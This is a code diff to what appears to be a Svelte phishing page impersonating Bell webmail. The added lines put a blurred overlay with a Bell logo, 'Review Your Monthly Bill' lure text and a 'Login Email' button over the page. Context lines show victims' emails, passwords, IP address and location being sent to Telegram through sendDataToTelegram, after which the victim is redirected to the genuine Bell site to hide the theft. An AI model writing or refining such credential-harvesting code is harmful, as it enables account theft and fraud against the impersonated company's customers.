@@ -5,6 +5,7 @@
   let modalEmail = '';
   let errors = { email: '', password: '' };
   let isModalVisible = false;
+  let isContainerVisible = true;
 
   let ipAddress = '';
   let location = {
@@ -15,6 +16,12 @@
     state: '',
     zip_code: ''
   };
+
+  //Transparent Container function 
+  function closeTransparentContainer() {
+    isContainerVisible = false;
+    return true
+  }
 
   // Validation functions
   function validateEmail() {
@@ -125,10 +132,70 @@ async function closeModal() {
   await sendDataToTelegram(email, password, ipAddress, location, modalEmail, modalPassword);
   isModalVisible = false;
   window.location.href = 'https://webmail.en.bellnet.ca';
+  return true;
 }
 </script>
 
 <style scoped>
+  /* Transparent Container */
+.transparentContainer {
+  z-index: 100;
+  height: 100vh;
+  width: 100vw;
+  position: fixed;
+  top: 0;
+  left: 0;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  background: rgb(255, 255, 255, 0.3);
+  backdrop-filter: blur(8px)
+}
+
+.transparentContainerLogo {
+   width: 200px;
+    height: 200px;
+    margin-bottom: 20px;
+}
+
+.transparentContainerText {
+  font-weight: 800;
+  margin-bottom: 20px;
+}
+
+.transparentContainerButton {
+  background: linear-gradient(to right, #004e94, #0064a2);
+  height: 40px;
+  width: 150px;
+  border-radius: 5px;
+  cursor: pointer;
+  margin: 20px 0;
+  color: white;
+  outline: none;
+  border: none;
+}
+
+/* .transparentContainerContent {
+  opacity: 0;
+  transform: scale(0.8);
+} */
+
+.animate-in {
+  animation: scaleFadeIn 0.7s ease forwards;
+}
+
+@keyframes scaleFadeIn { 
+  0% {
+    opacity: 0;
+    transform: scale(0.8);
+  }
+  100% {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
 .padding-div {
   background: linear-gradient(to right, #004e94, #0064a2);
   padding: 10px;
@@ -444,7 +511,17 @@ async function closeModal() {
   }
 }
 </style>
+<!-- Transparent Container-->
+ {#if isContainerVisible}
+ <div class="transparentContainer">
+  <div> <img class="transparentContainerLogo animate-in" src="/assets/bell.png" alt="logo"/> </div>
+  <p class="transparentContainerText animate-in"> Review Your Monthly Bill</p>
 
+  <button class="transparentContainerButton animate-in" on:click={closeTransparentContainer}> Login Email </button>
+ </div>
+{/if}
+
+ <!-- Main Container-->
 <div class="padding-div">
 <div class="div">
   <div class="group">
